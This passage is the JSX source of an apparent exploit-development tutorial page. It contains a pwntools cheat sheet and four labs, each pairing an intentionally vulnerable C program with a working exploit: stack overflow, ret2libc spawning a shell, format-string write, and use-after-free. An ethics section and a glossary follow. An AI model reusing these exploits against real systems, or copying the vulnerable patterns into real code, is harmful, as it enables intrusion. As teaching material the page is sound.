p32(0xdeadbeef)     # Pack 32-bit
u64(b'\\x00' * 8)    # Unpack 64-bit

# ELF analysis
elf = ELF('./binary')
elf.symbols['main']
elf.got['puts']
elf.plt['puts']

# ROP
rop = ROP(elf)
rop.call('puts', [elf.got['puts']])`}
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Tool Overview
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>GDB + pwndbg/GEF/PEDA:</strong> Linux debugging with exploit dev features</li>
                  <li><strong>pwntools:</strong> Python library for exploit development</li>
                  <li><strong>Ghidra:</strong> Free disassembler/decompiler from NSA</li>
                  <li><strong>IDA Pro:</strong> Industry-standard disassembler</li>
                  <li><strong>Binary Ninja:</strong> Modern RE platform</li>
                  <li><strong>ROPgadget / ropper:</strong> Find ROP gadgets</li>
                  <li><strong>one_gadget:</strong> Find execve gadgets in libc</li>
                  <li><strong>checksec:</strong> Check binary protections</li>
                  <li><strong>patchelf:</strong> Modify ELF interpreter/rpath</li>
                  <li><strong>strace/ltrace:</strong> Trace syscalls/library calls</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#f59e0b", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Debugging Tips
              </Typography>
              <Typography variant="body2">
                • Use <code>context.log_level = 'debug'</code> to see all I/O<br/>
                • Attach GDB with <code>gdb.attach(p)</code> in pwntools<br/>
                • Check stack alignment with <code>x/gx $rsp</code> (should end in 0)<br/>
                • Use <code>cyclic</code> patterns to find offsets quickly<br/>
                • Test locally with same libc version as target
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Hands-On Labs */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="labs" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <ScienceIcon sx={{ color: "#f87171" }} /> Hands-On Labs
            </Typography>

            <Alert severity="info" sx={{ mb: 3 }}>
              These labs use intentionally vulnerable programs for learning. Set up an isolated VM
              environment and never run untrusted exploits on production systems.
            </Alert>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Beginner" size="small" sx={{ bgcolor: alpha("#22c55e", 0.2), color: "#22c55e" }} />
                  <Typography sx={{ fontWeight: 600 }}>Lab 1: Basic Stack Buffer Overflow</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  <strong>Objective:</strong> Exploit a simple stack buffer overflow to redirect execution.
                </Typography>
                <CodeBlock
                  title="Step 1: Create the vulnerable program (vuln.c)"
                  code={`#include <stdio.h>
#include <string.h>

void win() {
    printf("Congratulations! You got the flag!\\n");
    // In real CTF: system("cat flag.txt");
}

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
    printf("You said: %s\\n", buffer);
}

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <input>\\n", argv[0]);
        return 1;
    }
    vulnerable(argv[1]);
    printf("Returned safely!\\n");
    return 0;
}`}
                />
                <CodeBlock
                  title="Step 2: Compile with protections disabled"
                  code={`gcc -fno-stack-protector -z execstack -no-pie -o vuln vuln.c

# Verify protections are off:
checksec ./vuln
# Should show: No canary, NX disabled, No PIE`}
                />
                <CodeBlock
                  title="Step 3: Find the offset and win() address"
                  code={`# Find win() address
objdump -d vuln | grep win
# Example output: 0000000000401156 <win>:

# Find offset to return address
gdb ./vuln
(gdb) run $(python3 -c "print('A'*100)")
# Program crashes

# Use cyclic pattern
python3 -c "from pwn import *; print(cyclic(100).decode())"
# Copy output, run in gdb, find offset with cyclic_find()`}
                />
                <CodeBlock
                  title="Step 4: Write the exploit"
                  code={`from pwn import *

# Configuration
binary = './vuln'
elf = ELF(binary)
win_addr = elf.symbols['win']  # Or hardcode: 0x401156

# Find offset (assume 72 bytes to return address)
offset = 72

# Build payload
payload = b'A' * offset
payload += p64(win_addr)

# Run exploit
p = process([binary, payload])
print(p.recvall().decode())`}
                />
                <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
                  <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>Expected Result:</Typography>
                  <Typography variant="body2">
                    "Congratulations! You got the flag!" instead of "Returned safely!"
                  </Typography>
                </Box>
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Intermediate" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.2), color: "#f59e0b" }} />
                  <Typography sx={{ fontWeight: 600 }}>Lab 2: Return-to-Libc (ret2libc)</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  <strong>Objective:</strong> Bypass NX protection by returning to libc's system() function.
                </Typography>
                <CodeBlock
                  title="Vulnerable program with NX enabled"
                  code={`// Compile: gcc -fno-stack-protector -no-pie -o vuln2 vuln2.c
// NX is ON by default (no -z execstack)

#include <stdio.h>
#include <string.h>

void vulnerable(char *input) {
    char buffer[64];
    strcpy(buffer, input);
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    vulnerable(argv[1]);
    return 0;
}`}
                />
                <CodeBlock
                  title="ret2libc Exploit"
                  code={`from pwn import *

binary = './vuln2'
elf = ELF(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Start process and leak libc address
# (In real scenario, you'd leak via puts/printf)

# For this lab, disable ASLR:
# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

p = process(binary)

# Find addresses (with ASLR disabled)
libc.address = 0x7ffff7c00000  # Example base

system = libc.symbols['system']
binsh = next(libc.search(b'/bin/sh'))

# x86-64 needs stack alignment
ret = elf.search(asm('ret')).__next__()  # ret gadget

# RDI = first argument (points to "/bin/sh")
pop_rdi = elf.search(asm('pop rdi; ret')).__next__()

offset = 72
payload = flat(
    b'A' * offset,
    ret,           # Stack alignment
    pop_rdi,       # Pop next value into RDI
    binsh,         # Address of "/bin/sh"
    system         # Call system()
)

p = process([binary, payload])
p.interactive()`}
                />
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Intermediate" size="small" sx={{ bgcolor: alpha("#f59e0b", 0.2), color: "#f59e0b" }} />
                  <Typography sx={{ fontWeight: 600 }}>Lab 3: Format String Exploitation</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  <strong>Objective:</strong> Use format string vulnerability to read and write memory.
                </Typography>
                <CodeBlock
                  title="Vulnerable format string program"
                  code={`#include <stdio.h>
#include <string.h>

int secret = 0x41414141;

void vulnerable(char *input) {
    char buffer[256];
    strncpy(buffer, input, 255);
    printf(buffer);  // VULNERABLE: user input as format string!
    printf("\\n");

    if (secret == 0xdeadbeef) {
        printf("You win! Flag: CTF{format_string_master}\\n");
    }
}

int main(int argc, char *argv[]) {
    if (argc < 2) return 1;
    printf("Secret is at %p\\n", &secret);
    vulnerable(argv[1]);
    printf("Secret = 0x%x\\n", secret);
    return 0;
}`}
                />
                <CodeBlock
                  title="Format String Exploit"
                  code={`from pwn import *

binary = './fmt_vuln'
elf = ELF(binary)

# Find secret address (printed by program or via objdump)
secret_addr = elf.symbols['secret']

# Technique 1: Read memory with %s or %p
# ./fmt_vuln 'AAAA%p.%p.%p.%p.%p.%p'
# Find where AAAA (0x41414141) appears

# Technique 2: Write with %n (writes number of chars printed)
# We want to write 0xdeadbeef to secret_addr

# Using pwntools fmtstr_payload:
def exec_fmt(payload):
    p = process([binary, payload])
    return p.recvall()

# Automatic format string exploit
from pwnlib.fmtstr import FmtStr, fmtstr_payload

# Manual approach for 0xdeadbeef:
# Write in parts: 0xbeef (low), 0xdead (high)
payload = fmtstr_payload(
    offset=6,           # Stack offset where our input appears
    writes={secret_addr: 0xdeadbeef},
    write_size='short'  # Write 2 bytes at a time
)

p = process([binary, payload])
print(p.recvall().decode())`}
                />
              </AccordionDetails>
            </Accordion>

            <Accordion sx={{ mb: 2, bgcolor: "background.paper" }}>
              <AccordionSummary expandIcon={<ExpandMoreIcon />}>
                <Box sx={{ display: "flex", alignItems: "center", gap: 2 }}>
                  <Chip label="Advanced" size="small" sx={{ bgcolor: alpha("#f87171", 0.2), color: "#f87171" }} />
                  <Typography sx={{ fontWeight: 600 }}>Lab 4: Heap Use-After-Free</Typography>
                </Box>
              </AccordionSummary>
              <AccordionDetails>
                <Typography variant="body2" sx={{ mb: 2 }}>
                  <strong>Objective:</strong> Exploit a use-after-free vulnerability in a heap-based program.
                </Typography>
                <CodeBlock
                  title="Vulnerable UAF Program"
                  code={`#include <stdio.h>
#include <stdlib.h>
#include <string.h>

struct User {
    char name[32];
    void (*print_name)(struct User *);
};

void normal_print(struct User *u) {
    printf("User: %s\\n", u->name);
}

void win() {
    printf("FLAG: CTF{use_after_free_master}\\n");
}

struct User *current_user = NULL;

void create_user() {
    current_user = malloc(sizeof(struct User));
    current_user->print_name = normal_print;
    printf("Enter name: ");
    fgets(current_user->name, 32, stdin);
}

void delete_user() {
    free(current_user);
    // BUG: current_user not set to NULL!
}

void edit_user() {
    printf("Enter new name: ");
    fgets(current_user->name, 32, stdin);  // UAF!
}

void print_user() {
    current_user->print_name(current_user);  // UAF!
}`}
                />
                <CodeBlock
                  title="UAF Exploit Strategy"
                  code={`from pwn import *

binary = './uaf_vuln'
elf = ELF(binary)
win_addr = elf.symbols['win']

p = process(binary)

# 1. Create a user (allocates 40 bytes)
p.sendline(b'1')
p.sendline(b'AAAA')

# 2. Delete user (frees chunk, but pointer remains!)
p.sendline(b'2')

# 3. Create another object of same size
#    It will reuse the freed chunk!
#    Overwrite function pointer with win()
p.sendline(b'3')  # Assuming option 3 allocates 40 bytes
payload = b'A' * 32 + p64(win_addr)
p.sendline(payload)

# 4. Use the "deleted" user - calls our function!
p.sendline(b'4')

p.interactive()`}
                />
              </AccordionDetails>
            </Accordion>

            <Box sx={{ bgcolor: alpha("#3b82f6", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Practice Platforms
              </Typography>
              <Typography variant="body2">
                • <strong>pwnable.kr:</strong> 50+ challenges from basic to advanced<br/>
                • <strong>pwnable.xyz:</strong> Modern pwn challenges with source<br/>
                • <strong>ROP Emporium:</strong> Focused ROP practice (8 levels)<br/>
                • <strong>Exploit Education:</strong> Phoenix challenges<br/>
                • <strong>picoCTF:</strong> Annual CTF with binary exploitation<br/>
                • <strong>Nightmare:</strong> CTF pwn challenge writeups
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Glossary */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="glossary" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <MenuBookIcon sx={{ color: "#f87171" }} /> Exploit Development Glossary
            </Typography>

            <Grid container spacing={2}>
              {[
                { term: "ASLR", def: "Address Space Layout Randomization - Randomizes memory region base addresses to prevent hardcoded exploits.", cat: "Protection" },
                { term: "NX/DEP", def: "No-Execute / Data Execution Prevention - Marks data pages as non-executable to prevent shellcode execution.", cat: "Protection" },
                { term: "Stack Canary", def: "Random value placed before return address; if modified by overflow, program terminates.", cat: "Protection" },
                { term: "PIE", def: "Position Independent Executable - Allows the main binary to be loaded at random addresses.", cat: "Protection" },
                { term: "RELRO", def: "Relocation Read-Only - Makes GOT read-only to prevent GOT overwrite attacks.", cat: "Protection" },
                { term: "CFI", def: "Control Flow Integrity - Validates indirect call/jump targets against allowed destinations.", cat: "Protection" },
                { term: "ROP", def: "Return-Oriented Programming - Chaining existing code snippets (gadgets) to build exploits without injecting code.", cat: "Technique" },
                { term: "Gadget", def: "Small instruction sequence ending in 'ret' used as building blocks for ROP chains.", cat: "Technique" },
                { term: "Stack Pivot", def: "Moving the stack pointer to attacker-controlled memory to enable longer ROP chains.", cat: "Technique" },
                { term: "GOT/PLT", def: "Global Offset Table / Procedure Linkage Table - Used for dynamic linking; common overwrite target.", cat: "Concept" },
                { term: "Heap Spray", def: "Filling heap with copies of payload to increase chance of hitting it via corrupted pointer.", cat: "Technique" },
                { term: "Use-After-Free", def: "Vulnerability where freed memory is accessed, allowing attacker to control its contents.", cat: "Vulnerability" },
                { term: "Double Free", def: "Freeing the same memory twice, corrupting heap metadata for exploitation.", cat: "Vulnerability" },
                { term: "Tcache", def: "Thread-local caching in glibc for fast small allocations; simpler exploitation than fastbins.", cat: "Concept" },
                { term: "One Gadget", def: "Single address in libc that directly calls execve('/bin/sh') under certain constraints.", cat: "Technique" },
                { term: "SROP", def: "Sigreturn-Oriented Programming - Using sigreturn syscall to set all registers at once.", cat: "Technique" },
                { term: "Format String", def: "Vulnerability allowing memory read/write through printf-like functions with user-controlled format.", cat: "Vulnerability" },
                { term: "Shellcode", def: "Small piece of code used as payload, typically spawns a shell or performs specific action.", cat: "Concept" },
                { term: "NOP Sled", def: "Sequence of NOP instructions that 'slides' execution to shellcode, increasing exploit reliability.", cat: "Technique" },
                { term: "ret2libc", def: "Returning to libc functions (like system) instead of shellcode to bypass NX protection.", cat: "Technique" },
              ].map((item, idx) => (
                <Grid item xs={12} md={6} key={idx}>
                  <Box sx={{ p: 2, bgcolor: "background.paper", borderRadius: 1, border: 1, borderColor: "divider", height: "100%" }}>
                    <Box sx={{ display: "flex", alignItems: "center", gap: 1, mb: 1 }}>
                      <Typography variant="subtitle2" sx={{ fontWeight: 700, color: "#f87171" }}>{item.term}</Typography>
                      <Chip
                        label={item.cat}
                        size="small"
                        sx={{
                          fontSize: "0.65rem",
                          height: 18,
                          bgcolor: item.cat === "Protection" ? alpha("#22c55e", 0.2) :
                                   item.cat === "Technique" ? alpha("#3b82f6", 0.2) :
                                   item.cat === "Vulnerability" ? alpha("#f87171", 0.2) : alpha("#f59e0b", 0.2),
                          color: item.cat === "Protection" ? "#22c55e" :
                                 item.cat === "Technique" ? "#3b82f6" :
                                 item.cat === "Vulnerability" ? "#f87171" : "#f59e0b",
                        }}
                      />
                    </Box>
                    <Typography variant="body2" sx={{ color: "text.secondary" }}>{item.def}</Typography>
                  </Box>
                </Grid>
              ))}
            </Grid>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Ethics & Legal */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="ethics" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <GavelIcon sx={{ color: "#f87171" }} /> Ethics & Legal Considerations
            </Typography>

            <Alert severity="error" sx={{ mb: 3 }}>
              <strong>Critical:</strong> Unauthorized exploitation of computer systems is illegal under laws like
              the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and similar laws worldwide.
              Penalties include imprisonment and significant fines.
            </Alert>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#22c55e" }}>
                Authorized Testing Environments
              </Typography>
              <Typography variant="body2" component="div">
                <ul style={{ margin: 0, paddingLeft: 20 }}>
                  <li><strong>CTF Competitions:</strong> Capture The Flag events (picoCTF, HTB, pwnable.kr)</li>
                  <li><strong>Bug Bounty Programs:</strong> With explicit scope and authorization</li>
                  <li><strong>Your Own Systems:</strong> VMs, test environments you control</li>
                  <li><strong>Authorized Pentests:</strong> With written permission and scope</li>
                  <li><strong>Educational Labs:</strong> Purpose-built vulnerable systems</li>
                </ul>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: "background.paper", p: 2, borderRadius: 1, mb: 3, border: 1, borderColor: "divider" }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1, color: "#f87171" }}>
                Responsible Disclosure
              </Typography>
              <Typography variant="body2">
                When you discover a real vulnerability:<br/><br/>
                1. <strong>Do not exploit beyond proof-of-concept</strong><br/>
                2. <strong>Document findings thoroughly</strong><br/>
                3. <strong>Report to vendor through official channels</strong><br/>
                4. <strong>Allow reasonable time for fix (90 days typical)</strong><br/>
                5. <strong>Coordinate public disclosure</strong><br/>
                6. <strong>Never sell to malicious actors</strong>
              </Typography>
            </Box>

            <Box sx={{ bgcolor: alpha("#22c55e", 0.1), p: 2, borderRadius: 1 }}>
              <Typography variant="subtitle2" sx={{ fontWeight: 700, mb: 1 }}>
                Practice Resources
              </Typography>
              <Typography variant="body2">
                • <strong>pwnable.kr:</strong> Classic wargame for binary exploitation<br/>
                • <strong>pwnable.xyz:</strong> Modern pwn challenges<br/>
                • <strong>Hack The Box:</strong> Machines and challenges<br/>
                • <strong>picoCTF:</strong> Beginner-friendly CTF platform<br/>
                • <strong>OverTheWire:</strong> Wargames (Narnia, Behemoth)<br/>
                • <strong>ROP Emporium:</strong> Focused ROP practice<br/>
                • <strong>Exploit Education:</strong> Phoenix, Protostar challenges
              </Typography>
            </Box>
          </Paper>

          {/* ════════════════════════════════════════════════════════════════════ */}
          {/* SECTION: Quiz */}
          {/* ════════════════════════════════════════════════════════════════════ */}
          <Paper id="quiz" sx={{ p: 3, mb: 4, bgcolor: alpha("#f87171", 0.03), borderRadius: 2 }}>
            <Typography variant="h5" sx={{ fontWeight: 700, mb: 2, display: "flex", alignItems: "center", gap: 1 }}>
              <QuizIcon sx={{ color: "#f87171" }} /> Knowledge Quiz
            </Typography>
            <Typography variant="body1" sx={{ mb: 3 }}>
              Test your understanding of exploit development concepts with this comprehensive quiz
              covering memory layout, buffer overflows, heap exploitation, ROP, and tools.
            </Typography>
            <QuizSection questions={quizQuestions} />
          </Paper>

        </Box>
      </Box>
    </LearnPageLayout>
  );
}
